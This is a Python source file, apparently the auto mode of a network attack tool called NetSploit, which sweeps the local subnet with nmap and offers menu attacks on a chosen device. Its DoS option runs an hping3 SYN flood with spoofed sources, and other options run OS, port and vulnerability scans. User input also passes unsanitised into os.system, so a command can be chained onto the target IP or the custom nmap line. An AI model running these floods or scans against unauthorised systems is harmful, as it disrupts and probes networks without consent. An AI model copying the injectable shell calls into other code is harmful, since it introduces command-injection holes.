# import required modules and libraries
import os
from simple_colors import yellow, blue, green, red, cyan
import datetime
from functions.utils.font_styles import *
from functions.utils.config import logs_folder_path, db
import time

def auto():
    from functions.utils.prompt import prompt
    print()
    success_message('NetSploit is now running in auto mode')
    net = str(os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read())  # noqa // Get LAN ip address. eg:  192.168.0.2\n
    net = net.replace("\n", "")  # Remove newline from `net`. eg: 192.168.0.2  # noqa
    net2 = net[:-1]  # Remove last character from `net`. eg: 192.168.0.
    net3 = net2 + "0"  # Add zero (0) to the end of the `net2`. eg: 192.168.0.  # noqa
    net4 = net3 + "/24"  # Add /24 to the end of `net3`. eg: 192.168.0.0/24  # noqa
    IP_RANGE = net4
    info_message(f'Running network scan on {IP_RANGE}...')
    # if IP_RANGE is False:  # If IP_RANGE is False, AKA, not set:
    #     error_message('Cannot start scan without IP_RANGE. Set the IP_RANGE using:', 'IP_RANGE => Your-IP-range-here')  # noqa
    #     network_scanner()  # Show the network scanner prompt
    # info_message(f'Running network scan with IP range {IP_RANGE}, this may take up to two minutes')  # noqa
    info_message('Running a network scan properly requires the command to be run using sudo')  # noqa
    print()
    os.system(f'sudo nmap -sn -T4 {IP_RANGE}')
    print()
    success_message('Finished scanning network.')
    print()
    target_device = input(f'[{green(">", "bold")}] {cyan("Enter target device IP: ", "bold")}')  # noqa
    if target_device:
        print()
        print(f'{yellow("Available scans/attacks:", ["underlined", "bold"])}\n\n  1 - Device Info\n  2 - OS Guesser\n  3 - Port Scanner\n  4 - DoS Attack\n  5 - Ping\n  6 - Vulnerability Scan\n  7 - Custom nmap command')  # noqa
        print()

        choice = str(input(f'[{green(">", "bold")}] {cyan("Enter scan/attack to run on", "bold")} {yellow(target_device, "bold")}: '))  # noqa
        if choice == '1':
            print()
            info_message(f'Selected {green("device-info", "bold")} module')  # noqa
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                         Device Info                             │
    │                                                                 │
    │      Use a series of scans to gather information about          │
    │                      the target device                          │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            print()
            time.sleep(1)
            info_message(f'Running device scan on {target_device}, this may take up to two minutes')  # noqa
            info_message('Running a device scan properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo nmap -v -A -T4 {target_device} -Pn')
            print()
            success_message(f'Finished scanning {target_device}')
            print()
            info_message('Exited auto mode')
            print()
            prompt()

        elif choice == '2':
            print()
            info_message(f'Selected {green("os-guesser", "bold")} module')  # noqa
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                          OS Guesser                             │
    │                                                                 │
    │      Use a series of scans to gather information such as        │
    │      the operating system the target is running, the version    │
    │                of the operating system, etc.                    │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            print()
            time.sleep(1)
            info_message(f'Running OS Guesser scan on {target_device}, this may take up to two minutes')  # noqa
            info_message('Running a OS Guesser scan properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo nmap -T4 -O --osscan-guess {target_device} -Pn')  # noqa
            print()
            success_message(f'Finished scanning {target_device}')
            print()
            info_message('Exited auto mode')
            print()
            prompt()

        elif choice == '3':
            print()
            info_message(
                f'Selected {green("port-scanner", "bold")} module')
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                          Port Scanner                           │
    │                                                                 │
    │             Scan the target device for open ports               │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            print()
            time.sleep(1)
            info_message(f'Running port scan on {target_device}, this may take up to two minutes')  # noqa
            print()
            os.system(f'nmap -T4 -sV {target_device} -Pn')
            print()
            success_message(f'Finished scanning {target_device}')
            print()
            info_message('Exited auto mode')
            print()
            prompt()

        elif choice == '4':
            print()
            info_message(f'Selected {green("dos", "bold")} module')
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                           DoS Attack                            │
    │     Send a succession of SYN requests to the target system      │
    │     to make the system unresponsive to legitimate traffic       │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            time.sleep(1)
            print()
            info_message(f'Running DoS attack on {target_device}, this may take up to two minutes')  # noqa
            info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {target_device}')  # noqa
            print()
            success_message(f'Finished attacking {target_device}')
            print()
            info_message('Exited auto mode')
            print()
            prompt()

        elif choice == '5':
            print()
            info_message(f'Selected {green("ping", "bold")} module')
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                              Ping                               │
    │                                                                 │
    │                Check the accessibility of devices               │
    │      and show how long it takes for packets to reach host       │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            time.sleep(1)
            print()
            info_message(f'Pinging {target_device} (5 times)...\n')
            os.system(f'ping -c 5 {target_device}')
            print()
            success_message(f'Finished pinging {target_device}\n')
            print()
            info_message('Exited auto mode.')
            print()
            prompt()

        elif choice == '6':
            print()
            info_message(f'Selected {green("vuln-scannner", "bold")} module')  # noqa
            print(""" \033[1;36m
    ╒═════════════════════════════════════════════════════════════════╕
    │                                                                 │
    │                      Vulnerability Scanner                      │
    │                                                                 │
    │          Scan the target for potential vulnerabilities          │
    │                     that can be exploited                       │
    ╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
            time.sleep(1)
            print()
            info_message(f'Running Vulnerability scan on {target_device}, this may take up to two minutes')  # noqa
            # info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
            print()
            # os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {TARGET}')  # noqa
            os.system(f'nmap --script nmap-vulners/ -sV -T4 {target_device}')  # noqa
            print()
            success_message(f'Finished scanning {target_device}')
            print()
            info_message('Exited auto mode.')
            print()
            prompt()

        elif choice == '7':
            print()
            info_message(f'Selected {green("custom", "bold")} module')
            print()
            custom_nmap_cmd = input(f'[{green(">", "bold")}] {cyan("Enter custom nmap command to run: ", "bold")}')  # noqa
            if custom_nmap_cmd.startswith('nmap'):
                print()
                success_message(
                    f'Running custom nmap command "{custom_nmap_cmd}"')
                print()
                os.system(custom_nmap_cmd)
                print()
                info_message('Exited auto mode.')
                print()
                prompt()
            else:
                print()
                error_message(f'Your command must be an nmap command! To run any other shell command, use the {yellow("shell", "bold")} (netsploit) command.')  # noqa
                print()
                info_message('Exited auto mode.')
                print()
                prompt()
        else:
            error_message('Error: you did not provide a valid scan / attack.')  # noqa

    else:
        error_message('Error: you did not provide a target device IP.')
        prompt()